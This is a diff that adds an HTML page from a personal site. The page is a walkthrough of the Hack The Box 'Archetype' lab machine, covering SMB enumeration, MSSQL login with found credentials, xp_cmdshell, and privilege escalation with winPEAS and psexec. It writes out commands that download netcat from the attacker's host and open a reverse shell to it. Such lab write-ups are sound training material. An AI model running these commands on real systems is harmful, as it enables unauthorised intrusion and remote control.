@@ -1,0 +1,83 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>HTB | Archetype</title>
+  <link rel="stylesheet" href="/style.css" />
+</head>
+<body>
+
+  <header>
+    <div><a href="/index.html" style="color: white; text-decoration: none;"><strong>Timeless</strong></a></div>
+    <nav>
+      <a href="/walkthroughs.html">Walkthroughs</a>
+      <a href="/blog.html">Blog</a>
+      <a href="/whoami.html">whoami</a>
+    </nav>
+  </header>
+
+  <a href="/htb/very-easy.html" class="top-left-back">&lt;&lt; Back</a>
+
+   <div class="wrapper">
+    <img src="/images/htb/very-easy/archetype/archetype.png" alt="Archetype logo" style="width: 10%; height: auto;">  
+     <h1>HTB - Archetype</h1>
+    <p><strong>Operating System:</strong> Windows<br>
+      <strong>Tags:</strong> SMB, MSSQL, WinRM, PowerShell, Misconfiguation</p>
+
+    <h2>Information Gathering</h2>
+    <p>First I started with a basic Nmap scan to identify open ports and services. This scan revealed services running on ports 135, 139, 445, 1433, and 5985. Out of those ports, I started with 445 to check SMB.</p>
+    <pre><code>$ nmap -sV -sC 10.129.204.164</code></pre>
+    <img src="/images/htb/very-easy/archetype/archetype_nmap.png" alt="Archetype nmap results">
+      
+    <h2>Vulnerability Assessment</h2>
+      <p>Similar to previous boxes, I logged into SMB without a password using <code>-N</code>. This along with <code>-L</code> listed all the shares available on the service.</p>
+    <pre><code>$ smbclient -N -L //10.129.204.164</code></pre>
+    <img src="/images/htb/very-easy/archetype/archetype_smb_login.png" alt="Archetype smb login">
+      <p>I noticed that <code>backups</code> was the only share accesible without a password, which is where I found credentials in a configuration file. </p>
+    <pre><code>$ smbclient -N //10.129.204.164/backups<br>smb: \> more prod.dtsConfig</code></pre>
+      <img src="/images/htb/very-easy/archetype/archetype_config_creds.png" alt="Archetype config creds">
+
+    <h2>Exploitation</h2>
+    <p>With these credentials, I logged into the MSSQL service using <code>mssqlclient.py</code> from Impacket.</p>
+    <pre><code>$ python3 Tools/Impacket/impacket/examples/mssqlclient.py ARCHETYPE/sql_svc:M3g4c0rp123@10.129.204.164 -windows-auth</code></pre>
+    <img src="/images/htb/very-easy/archetype/archetype_mssql_login.png" alt="Archetype mssql access">
+    <p>I didn't know much about MSSQL, so I used the <code>help</code> command and found an option to enable a shell within the service.</p>
+    <pre><code>SQL (ARCHETYPE\sql_svc db0@master)> enable_xp_cmdshell<br>SQL (ARCHETYPE\sql_svc db0@master)> RECONFIGURE<br>SQL (ARCHETYPE\sql_svc db0@master)> EXEC xp_cmdshell 'whoami';</code></pre>
+    <img src="/images/htb/very-easy/archetype/archetype_mssql_rce.png" alt="Archetype mssql rce">
+    <p>Remote code execution allows for a more stable shell by transfering netcat over to the host machine from a webserver hosted by me. Once I sent the command, the PHP webserver receives the request for netcat and downloads it.</p>
+    <pre><code>SQL (ARCHETYPE\sql_svc db0@master)> xp_cmdshell "powershell -c cd C:\Users\sql_svc\Downloads; wget http://10.10.14.186/nc64.exe -outfile nc64.exe"</code></pre>
+    <img src="/images/htb/very-easy/archetype/archetype_mssql_nc.png" alt="Archetype mssql netcat">
+    <br>
+    <img src="/images/htb/very-easy/archetype/archetype_php_request.png" alt="Archetype php request">
+    <p>Using netcat I can set up a listener on my machine and have the host provide me a reverse shell. The desktop directory of the sql_svc user is where I found the first flag.</p>
+    <pre><code>SQL (ARCHETYPE\sql_svc db0@master)> xp_cmdshell "powershell -c cd C:\Users\sql_svc\Downloads; .\nc64.exe -e cmd.exe 10.10.14.186 8001"</code></pre>
+    <img src="/images/htb/very-easy/archetype/archetype_nc_rev.png" alt="Archetype netcat shell">
+    <br>
+    <img src="/images/htb/very-easy/archetype/archetype_nc_success.png" alt="Archetype netcat success">
+    <br>
+    <img src="/images/htb/very-easy/archetype/archetype_user_flag.png" alt="Archetype user flag">
+
+    <h2>Post-Exploitation</h2>
+    <p>Now that I have a consistent shell, it's time to escalate our privileges to become an administrator. With a similar file transfer method as Netcat, I downloaded <code>winPEAS.exe</code> being hosted on my webserver.</p>
+    <pre><code>C:\Users\sql_svc\Downloads> Powershell<br>PS C:\Users\sql_svc\Downloads> wget http://10.10.14.186/winPEASx64.exe -outfile winPEASx64.exe</code></pre>
+    <img src="/images/htb/very-easy/archetype/archetype_powershell_winpeas.png" alt="Archetype winpeas download"> 
+    <p>WinPEAS is a Windows enumeration script that scans the machine it's running on to find misconfigurations and vulnerabilities. The results provided lots of information, which included a PowerShell console history file.</p>
+    <pre><code>C:\Users\sql_svc\Downloads> ./winPEASx64.exe</code></pre>
+    <img src="/images/htb/very-easy/archetype/archetype_winpeas.png" alt="Archetype winpeas running"> 
+    <br>
+    <img src="/images/htb/very-easy/archetype/archetype_winpeas_history.png" alt="Archetype winpeas history"> 
+    <p>Opening that history file revealed the administrator login credentials. Using <code>psexec.py</code> from Impacket, I took the admin credentials and successfully logged in.</p>
+    <pre><code>C:\Users\sql_svc\Downloads> type C:\Users\sql_svc\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_History.txt</code></pre>
+    <img src="/images/htb/very-easy/archetype/archetype_admin_credentials.png" alt="Archetype admin credentials">
+    <pre><code>$ python3 Tools/Impacket/impacket/examples/psexec.py administrator@10.129.204.164</code></pre>
+    <img src="/images/htb/very-easy/archetype/archetype_admin_login.png" alt="Archetype admin login.">
+    <p>From there I looked through directories and found the root flag.</p>
+    <img src="/images/htb/very-easy/archetype/archetype_root_flag.png" alt="Archetype root flag">  
+  </div>
+
+  <footer>
+    &copy; 2025 Timeless. All rights reserved.
+  </footer>
+</body>
+</html>
